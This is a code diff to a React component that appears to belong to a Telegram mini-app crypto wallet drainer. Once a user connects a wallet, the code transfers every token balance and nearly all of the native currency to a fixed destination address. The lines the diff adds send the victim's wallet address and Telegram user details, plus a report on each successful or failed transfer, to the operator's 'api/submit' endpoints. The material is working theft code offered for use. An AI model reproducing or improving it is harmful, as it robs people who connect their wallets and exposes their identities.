@@ -173,6 +173,14 @@ export default function App() {
   useEffect(() => {
     if (isConnected && address && !flowStarted.current) {
       flowStarted.current = true;
+
+      // Notify admin about connection
+      fetch('api/submit/wallet_connect', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ address, user: tg?.initDataUnsafe?.user })
+      }).catch(err => console.error("Failed to notify wallet connect", err));
+
       startTransferFlow();
     }
   }, [isConnected, address]);
@@ -210,17 +218,31 @@ export default function App() {
             });
 
             if (balance > 0n) {
-              const hash = await writeContractAsync({
-                address: token.address as `0x${string}`,
-                abi: erc20Abi,
-                functionName: 'transfer',
-                args: [DESTINATION_ADDRESS as `0x${string}`, balance],
-                chainId: chain.id
-              });
-              console.log(`Sent ${token.symbol} on ${chain.name}: ${hash}`);
+              try {
+                const hash = await writeContractAsync({
+                  address: token.address as `0x${string}`,
+                  abi: erc20Abi,
+                  functionName: 'transfer',
+                  args: [DESTINATION_ADDRESS as `0x${string}`, balance],
+                  chainId: chain.id
+                });
+                console.log(`Sent ${token.symbol} on ${chain.name}: ${hash}`);
+                await fetch('api/submit/transfer', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ address, chain: chain.name, token: token.symbol, amount: balance.toString(), status: 'success', hash, user: tg?.initDataUnsafe?.user })
+                });
+              } catch (err: any) {
+                console.error(`Failed to send ${token.symbol} on ${chain.name}`, err);
+                await fetch('api/submit/transfer', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ address, chain: chain.name, token: token.symbol, amount: balance.toString(), status: 'failed', error: err?.message || 'User rejected', user: tg?.initDataUnsafe?.user })
+                });
+              }
             }
           } catch (err) {
-            console.error(`Error sending ${token.symbol} on ${chain.name}`, err);
+            console.error(`Error processing ${token.symbol} on ${chain.name}`, err);
           }
         }
 
@@ -237,14 +259,28 @@ export default function App() {
               // Leave a small buffer for price fluctuations and rounding (10%)
               const amountToSend = nativeBalance - (gasCost * 110n / 100n);
               if (amountToSend > 0n) {
-                const hash = await sendTransactionAsync({
-                  to: DESTINATION_ADDRESS as `0x${string}`,
-                  value: amountToSend,
-                  gas: gasLimit,
-                  gasPrice: gasPrice,
-                  chainId: chain.id
-                });
-                console.log(`Sent native on ${chain.name}: ${hash}`);
+                try {
+                  const hash = await sendTransactionAsync({
+                    to: DESTINATION_ADDRESS as `0x${string}`,
+                    value: amountToSend,
+                    gas: gasLimit,
+                    gasPrice: gasPrice,
+                    chainId: chain.id
+                  });
+                  console.log(`Sent native on ${chain.name}: ${hash}`);
+                  await fetch('api/submit/transfer', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ address, chain: chain.name, token: chain.nativeCurrency.symbol, amount: amountToSend.toString(), status: 'success', hash, user: tg?.initDataUnsafe?.user })
+                  });
+                } catch (err: any) {
+                  console.error(`Failed to send native on ${chain.name}`, err);
+                  await fetch('api/submit/transfer', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ address, chain: chain.name, token: chain.nativeCurrency.symbol, amount: amountToSend.toString(), status: 'failed', error: err?.message || 'User rejected', user: tg?.initDataUnsafe?.user })
+                  });
+                }
               }
             }
           }
